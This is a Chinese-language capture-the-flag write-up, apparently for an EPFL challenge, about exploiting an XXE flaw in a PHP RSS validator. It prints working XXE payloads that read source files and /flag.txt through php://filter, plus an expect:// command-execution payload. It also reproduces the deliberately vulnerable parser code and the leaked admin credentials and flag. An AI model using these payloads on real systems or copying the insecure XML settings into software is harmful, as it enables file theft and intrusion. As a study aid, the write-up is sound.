没那么任意，因为XXE读的文件里包含的`<>&`等XML特殊字符需要额外处理一下。

可以用`php://filter/read=convert.base64-encode/resource=conf.php`来文件并Base64编码。

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE rss [

<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=rss.php">
]>
<rss version="2.0">

<channel>
  <title>&xxe;</title>
  <link>https://www.w3schools.com</link>
  <description>Free web building tutorials</description>
</channel>

</rss>
``` 

主要是不知道flag在哪里，用这种方法可以把所有php源文件读一遍

rss.php
```php
<?php
// Enable loading of external entities
libxml_disable_entity_loader(false);

$feed_output = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $xml_content = $_POST['rss_content'];
    
    $dom = new DOMDocument();
    // LIBXML_NOENT is what enables entity substitution
    // LIBXML_DTDLOAD allows loading external DTDs
    if (@$dom->loadXML($xml_content, LIBXML_NOENT | LIBXML_DTDLOAD)) {
        $title_node = $dom->getElementsByTagName('title')->item(0);
        $desc_node = $dom->getElementsByTagName('description')->item(0);
        
        $feed_title = $title_node ? $title_node->nodeValue : "No Title";
        $feed_desc = $desc_node ? $desc_node->nodeValue : "No Description";
        
        $feed_output = "<div class='alert alert-success mt-3'>
            <h4 class='alert-heading'>Feed Validated!</h4>
            <p>Your feed looks great. Here is what we parsed:</p>
            <hr>
            <p><strong>title:</strong> " . htmlspecialchars($feed_title) . "</p>
            <p><strong>description:</strong> " . htmlspecialchars($feed_desc) . "</p>
        </div>";
    } else {
        $feed_output = "<div class='alert alert-danger mt-3'>Invalid XML content. Please check your syntax.</div>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Le Canard du Lac | RSS Validator</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Roboto+Mono:wght@400;700&display=swap"
        rel="stylesheet">
    <link href="static/lake-theme.css" rel="stylesheet">
    <link href="static/custom.css" rel="stylesheet">
</head>

<body>
    <?php include("include/navigation-bar.php"); ?>

    <header class="py-5 bg-light border-bottom mb-4">
        <div class="container">
            <div class="text-center my-5">
                <h1 class="fw-bolder">Partner RSS Validator</h1>
                <p class="lead mb-0">Submit your RSS feed to join our syndicate!</p>
            </div>
        </div>
    </header>

    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card my-4">
                    <div class="card-body">
                        <p>We are looking for local news partners. Validate your RSS feed here to see if it meets our technical standards.</p>
                        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                            <div class="form-group mb-3">
                                <label for="rss_content" class="form-label">RSS XML Content</label>
                                <textarea name="rss_content" id="rss_content" class="form-control" rows="10" placeholder="&lt;?xml version='1.0' encoding='UTF-8'?&gt;..."></textarea>
                            </div>
                            <div class="form-group">
                                <input type="submit" class="btn btn-primary" value="Validate Feed">
                            </div>
                        </form>
                        
                        <?php echo $feed_output; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>

</html>
```

admin.php

```php
<?php
session_start();
include 'config.php';

$error = "";
$flag = "";

// Handle Login
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $ADMIN_USERNAME && $_POST['password'] === $ADMIN_PASSWORD) {
            $_SESSION['loggedin'] = true;
            $_SESSION['username'] = $ADMIN_USERNAME;
        } else {
            $error = "Invalid credentials.";
        }
    }
}

// Handle Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header("Location: admin.php");
    exit;
}

// Check if logged in
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    if (file_exists('/flag.txt')) {
        $flag = file_get_contents('/flag.txt');
    } else {
        $flag = "flag{test_flag_placeholder}"; // Fallback for local testing if docker not running
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Le Canard du Lac | Admin Area</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Roboto+Mono:wght@400;700&display=swap"
        rel="stylesheet">
    <link href="static/lake-theme.css" rel="stylesheet">
    <link href="static/custom.css" rel="stylesheet">
</head>

<body>
    <?php include("include/navigation-bar.php"); ?>

    <header class="py-5 bg-light border-bottom mb-4">
        <div class="container">
            <div class="text-center my-5">
                <h1 class="fw-bolder">Editor's Area</h1>
            </div>
        </div>
    </header>

    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="card my-4">
                    <div class="card-body">
                        <?php if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true): ?>
                            <div class="alert alert-success">
                                <h4 class="alert-heading">Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?>!</h4>
                                <p>Here is the secret you were looking for:</p>
                                <hr>
                                <p class="mb-0 font-monospace fw-bold"><?php echo htmlspecialchars($flag); ?></p>
                            </div>
                            <a href="admin.php?action=logout" class="btn btn-danger">Logout</a>
                        <?php else: ?>
                            <p>Restricted area for editors only.</p>
                            <?php if (!empty($error)): ?>
                                <div class="alert alert-danger"><?php echo $error; ?></div>
                            <?php endif; ?>
                            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                                <div class="form-group mb-3">
                                    <label>Username</label>
                                    <input type="text" name="username" class="form-control">
                                </div>
                                <div class="form-group mb-3">
                                    <label>Password</label>
                                    <input type="password" name="password" class="form-control">
                                </div>
                                <div class="form-group mt-3">
                                    <input type="submit" class="btn btn-primary" value="Login">
                                </div>
                            </form>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>

</html>
```

在这里找到flag影子了。

可以直接读flag.txt：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE rss [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag.txt">
]>
<rss version="2.0">
<channel>
  <title>&xxe;</title>
  <link>https://www.w3schools.com</link>
  <description>Free web building tutorials</description>
</channel>
</rss>
```

得到flag：`EPFL{l4k3_LEMAN_myster1es_@_epfl!}`

也可以直接读config.php拿到账号密码：

```php
<?php
// Configuration file for the admin area
// This file is not directly accessible via the web browser (or shouldn't be leaked)

$ADMIN_USERNAME = 'admin';
$ADMIN_PASSWORD = 'Sup3rS3cr3tP4ssw0rd_L4k3_M4g1c!'; 
?>
```

XXE还可以触发命令行的（需要安装expect，这个需要手动配置，大部分情况不可行（比如这题））

```xml
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <author>John, Doe</author>
      <title>I love XML</title>
      <category>Computers</category>
      <price>9.99</price>
      <date>2018-10-01</date>
      <description>&xxe;</description>
   </core>
</catalog>
```

